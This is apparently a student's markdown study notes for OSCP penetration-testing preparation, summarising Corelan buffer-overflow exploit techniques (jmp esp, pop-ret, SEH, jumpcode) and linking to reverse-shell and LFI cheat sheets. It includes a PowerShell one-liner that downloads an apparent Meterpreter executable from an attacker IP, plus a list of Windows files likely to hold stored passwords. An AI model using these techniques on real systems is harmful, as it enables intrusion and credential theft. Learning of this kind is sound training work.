# TJ Null Path to Try Harder
TJNull presented at BSidesDC 2019.  I've been using his blog as a good reference point to start for things to review BEFORE signing up for PWK.  Some content I decided to put in their own `md` files.  Links can be found here: https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html
# Active Recon

## Service Enum - Pen Testing Cheat Sheet

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
Local File Inclusion (LFI): https://highon.coffee/blog/lfi-cheat-sheet/
Linux Commands: https://highon.coffee/blog/linux-commands-cheat-sheet/ 
`systemd`/`systemctl` cheat sheet: https://highon.coffee/blog/systemd-cheat-sheet/
Reverse Shell Cheat Sheet: https://highon.coffee/blog/reverse-shell-cheat-sheet/

## Transferring Files to Your Account - Linux --> Windows
https://blog.ropnop.com/transferring-files-from-kali-to-windows/
- When on Windows (no `curl` or `wget`) use PS `WebClient` object: `(new-object System.Net.WebClient).DownloadFile('http://IP_ADDR/met888.exe','C:\Users\AdminUser\
Desktop\met888.exe')`

## Transferring Files to Your Account - Tools -
- `bitsadmin` - Windows command line tool to create download/upload jobs and monitor progress
#linkuphere
## Privileger Escalation
### Windows Guides - Fundamentals
http://www.fuzzysecurity.com/tutorials/16.html
Location to check for config files w/stored passwords:
Typically these are the directories that contain the configuration files (however it is a good idea to check the entire OS):
- c:\sysprep.inf
- c:\sysprep\sysprep.xml
- %WINDIR%\Panther\Unattend\Unattended.xml
- %WINDIR%\Panther\Unattended.xml

In addition to Groups.xml (stored in SYSVOL) several other policy preference files can have the optional "cPassword" attribute set:
Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes

### Windows Priv Esc Guide
Commands to run to check for XAMPP, Apache, or PHP and check for config files:
`dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf`

# Buffer Overflows
## Corelan
### (Part I)[https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/]
- Most functions start with: `PUSH EBP` followed by `MOV EBP,ESP`

Source Code:
```
#include  

void do_something(char *Buffer)
{
     char MyVar[128];
     strcpy(MyVar,Buffer);
}

int main (int argc, char **argv)
{
     do_something(argv[1]);
}
```

Register
```
00401290  /$ 55             PUSH EBP
00401291  |. 89E5           MOV EBP,ESP
00401293  |. 81EC 98000000  SUB ESP,98
00401299  |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]             ; |
0040129C  |. 894424 04      MOV DWORD PTR SS:[ESP+4],EAX             ; |
004012A0  |. 8D85 78FFFFFF  LEA EAX,DWORD PTR SS:[EBP-88]            ; |
004012A6  |. 890424         MOV DWORD PTR SS:[ESP],EAX               ; |
004012A9  |. E8 72050000    CALL                 ; \strcpy
004012AE  |. C9             LEAVE
004012AF  \. C3             RETN
```
- `SUB ESP,98` - decreemnt ESP by a certain number of bytes (most likely > 128 bytes) - gives space for the MyVar variable
- `MOV` and `LEA` instructions basically setup parameters for `strcpy` function taking pointer where `argv[1]` sits and copying data from `MyVar` into it
- `strcpy()` does not `PUSH` instructions to put data on stack, it reads a byte and writes it to the stack, using an index (i.e. `ESP`, `ESP+1`, `ESP+2`)
    - So `ESP` still points to the beginning of the string
- Means if data in Buffer is > `0x98`, it will overwrite saved `EBP` and eventually `EIP`
- `ESP` still points to beginning of string, `strcpy()` completes as if nothing is wrong, then function kicks in.  Moving `ESP` back to where saved `EIP` was stored and issue a `RET`

- _Stack Based Overflow_/_Stack Buffer Overflow_ - When a buffer on the stack overflows
- _Stack Overflow_ - trying to write past the end of the stack frame

> A quick note before proceeding : On intel x86, the addresses are stored little-endian (so backwards).  The AAAA you are seeing is in fact AAAA :-)  (or, if you have sent ABCD in your buffer, EIP would point at 44434241 (DCBA)

- `msf` has a tool `/pattern_create.rb` to generate a string that creates unique patterns, and `pattern_offset.rb` (`/usr/share/metasploit-framework/tools/exploit/`)
- Scenario
	- Buffer - All `A`s
	- EBP - is 4 Bytes, and all `A`vscodes as well
	- EIP - is set to `B`s
	- ESPs - All `C`s - to start
		- modify and add "shellcode" - aka pattern to identify where to point/what to run
		- analyze and determine there is a delay (aka ESP starts at 5th), which warrants `preshellcode`
		- then the goal is to build the real shellcode, & tell EIP to jump to the address of the start of the shellcode
			- overwrite EIP with `0x000ff730` aka address of `d esp` in the screenshots
			- *turns out you cannot just overwrite EIP with a direct memory adress* . Not a good idea because it isn't reliable and also contains a null byte (`0x00`)
			- So goal changes to make the application jump to own provided code
				- Reference a register (or offset to a register), such as ESP, and find function that will jump to that register
		- `ffe4` = opcode for `jmp esp`
		- Searching for opcodes
			- Tool DLL specific (walkthrough example): `s 0b1000 1 01fdd000 ff e4`
			- Windows DLLs: `s 70000000 l fffffff ff e4`
			- `findjmp`
			- [`metasploit` opcode DB](https://web.archive.org/web/20080704110517/http://www.metasploit.org/users/opcode/msfopcode.cgi)
			- `memdump`
			- `pvefindaddr`
		- `jmp esp` address from list must not have null bytes (since shellcode needs to go in `ESP`, and null bytes act as a string terminator - in most cases)

- Summary
    - See that ESP pointed directly to the beginning of the buffer
    - Use `jmp esp` statement to get shellcode to run


## (Part II)[https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/]
- Ways to force execution of shellcode
    - **Jump** or **call a register** that points to the shellcode (put that address in `EIP`)
        - Instead of overwriting `EIP` with address in memory, overwrite `EIP` with address of "jump to register"
    - **Pop Return** - if you can see an address on the stack that points to the shellcode, load that value into `EIP` by putting a pointer to `pop ret` or `pop pop ret` or `pop pop pop ret` into `EIP`
    - **Push Return** -  put address on the stack and do a `ret`
        - can't find a `or` opcode anywhere
        - basically find a `push` followed by a `ret`
        - Find the opcode for the sequence, find a address that performs this sequence and overwrite `EIP` with this address
    - **jmp [reg + offset]** - find an instruction in one of OS or application DLLs, which add the required bytes to register and THEN jump to the register
        - requires register that points to the buffer containing shellcode, but does _not_ point at the beginning of shellcode
    - **Blind return** - overwrite `EIP` with address that performs a `RET` you load the value stored at `ESP` into `EIP`
        - If available space in hte buffer (after `EIP` overwrite) is limited, but plenty of space before `EIP overwrite`, could use **jump code** in smaller buffer to jump to main shellcode in first
    - **SEH** - overwrite the SEH handler with own address, and make it jump to your shellcode
        - Ever yapplication has a default _Exception Handler_ which is provided by the OS
        - Can make it more relaible on various Windows platforms
        - Requires some more explanation before you start abusing SEH to write
        - If you build an exploit that doesn't work on an OS, the payload might just cras hthe app
            - By combining "regular" exploit with SEH exploit, you build a more reiable exploit

### `jmp`/call [reg]
Requirements
- Register is loaded with address that directly points to shellcode
    - i.e. if `ESP` points at shellcode, can overwrite `EIP` with address of `call esp`
- Works with all registers
- Quite popular because `kernel32.dll` contains a lot of `call [reg]` addresses

Functionality
- Do a `call[reg]` to jump directly to shellcode

### `pop ret`
Requirements
- Useful if there's not a SINGLE register that points to shellcode
- Address pointing to shellcode might be on stack
- Only usable when ESP+offset already contains addresses which points to the shellcode

Funtionality
- Address pointing to shellcode might be on stack
    - by `dump esp`, you can look at addresses, if one of addresses points to your shellcode, or buffer you control, can find a `pop ret` or `pop pop ret` to:
        - take addresses from stack (skip them)
        - jump to address which brings you to your shellcode
    - Put a reference to `pop ret`
        - will take some address from the stack(one addresses from each pop) and put the next address into `EIP`
    - If that address points to shellcode, you win!

Scenario #2
- Control `EIP`, no register points to shellcode, but shellcode can be found at `ESP+8`
    - can put a `pop pop ret` into EIP, which jumps to `ESP+8`
    - Put a pointer to `jmp esp` at that location, it jump sto shellcode that sits right after `jmp esp`

### `push ret`
Requirements
- Need to overwrite `EIP` with address of `push [reg]` + `ret` sequence in one of DLLs
- similar to `call [reg]`

Functionality
- if one of registers is directly pointing at shellcode & you cannot use `jmp[reg]` (to jump to shellcode):
    - put address of that register on the stack, it will sit on top of the stack
    - `ret` (Which takes the address back from the stack and jumps to it)
- Find the opcode for `push esp` and `ret`
- Search for opcode in DLL

### Blind Return
Requirements
- Useful if
    - Can't point `EIP` to register directly (no `jmp` or `call` instructions)
    - You can control data at ESP
- Need to have memory address of the shellcode (= address of ESP)
    - avoid address that starts with/contains null bytes

Functionality
- Overwrite `EIP` with address pointing to a `ret` instruction
- Hardcode address of shellcode at first 4 bytes of `ESP`
- When `ret` is executed, last added 4 bytes are popped from stack, and put into `EIP`
- Exploit jumps to shell

- Find address of `ret` in DLL
- Set first 4 bytes of shellcode (first 4 of ESP) to address where shellcode begins
- Overwrite `IP` with address of `ret` instruction
[26094 As][address of `ret][0x000fff730][shellcode]
** contains a null byte, so it will not execute/shellcode isn't put in ESP

### Small Buffers - Custom Jumpcode
Scenario: What if there isn't enough space to host hte entire shellcode?

In example:
    - 26094 bytes before overwriting EIP
    - ESP points to 26094+4 bytes
    - PLENNNNTTYYY of space

What if?
    - Only had 50 bytes?
    - Maybe use the 26094 bytes?

Steps
1. Find 26094 bytes in memory (in order to reference)
    - If you find the bytes reference, and find another register pointing at these bytes = EASY to put shellcode there
2. Find within stack if the beginning buffer is referenced
3. Can host the shellcode in the `A`'s and use the `X`s to jump to the `A`s
    - Requirement: position inside the buffer with 26094 `A`s thats part of ESP @ `000ff849` - need to know exactly where within all the `A`s the shellcode needs to be put
        - can be found using guesswork, custom patterns, or metasploit patterns
    - Requirement: **jumpcode** - code that makes the jupm from `X`s to `A`s - but can't be > 50 bytes
        - writing down required statements in assembly and translating to opcode
            -In example: jumping to ESP+281 = add 281 to `ESP` then perform `jump esp`
4. Overwrite `ESP` with `jmp esp`

Example:
- `ESP` points to the 50 `X`s (after 26094 `A`'s & `"BBBB"`)
- Looking farther down the stack, find the `A`s again (at `000ff849`)

End result:
- Real shellcode placed in first part of string, and will end up at `ESP+300`
- Real shellcode is prepended with `NOP`s
- `EIP` will be overwritten with `0c01ccf23a` (points to a dll, run `jmp esp`)
- Data ovewriting `EIP` will be overwritten with jump code that adds 282 to `ESP` and jumps to that address
- After payload sent, `EIP` will jump to `ESP`, which triggers jump code to jump to `ESP+282` = `NOP` sled, and shell code execute.

### `popad`
- **popad** (pop all double) - will pop double words from the stack (`ESP`) into general purpose registers, in 1 action
- can help with jumping to shellcode
- Registers are loaded: `EDI`, `ESI`, `EBP`, `EBX`, `EDX`, `ECX`, and `EAX`
- Result: `ESP` register is incremented after each register is loaded
- One `popad` will take 32 bytes from `ESP` and pops them in registers in an orderly fasion
- Opcode: `0x61`
- Scenario:
    - Need to jump 40 bytes, only have a couple of bytes to make the jump
    - Issue 2 `popad`s to point `ESP` to shellcode
        - Shellcode starts with `NOP`s

### Short Jump & Conditional Jumps
- short jump: opcode `0xeb` followed by the number of bytes (i.e. 30 byte jump = `0xeb,0x1e`)

## Additional Links
### Buffer Overflows Made Easy
Playlist: https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G
Correlates with TJNulls v2 Gude: https://github.com/johnjhacking/Buffer-Overflow-Guide

Status: on Video 2/8
- Need to download Windows 10, immunity debugger, and vulserver

- [Quick Guide to Assembly](https://inst.eecs.berkeley.edu/~cs161/sp15/discussions/dis06-assembly.pdf)

# Web App Attacks

## [Burp Suite Webinar](https://www.youtube.com/watch?v=h2duGBZLEek&t=28s)
- Github for Enumeration lists: `danielmiessler/Seclists`

# Random Links
Cuz there's so much info in all these sources, I don't want to have 500 tabs of ToDos. Its more of a TOC for other sections of the document as well

- [Buffer Overflows Made Easy](#buffer-overflows-made-easy)
- Bugcrowd U - [BugCrowd U - Burpsuite](#web-app-attacks)

# [Testlink](#Web-App-Attacks)
- XSS Walkthrough: https://www.youtube.com/watch?v=gkMl1suyj3M
- XSS Game - Google Game to work on BurpSuite Skills: http://xss-game.appspot.com/level1
- BugCrowd University Github: Other Links: <https://github.com/bugcrowd/bugcrowd_university>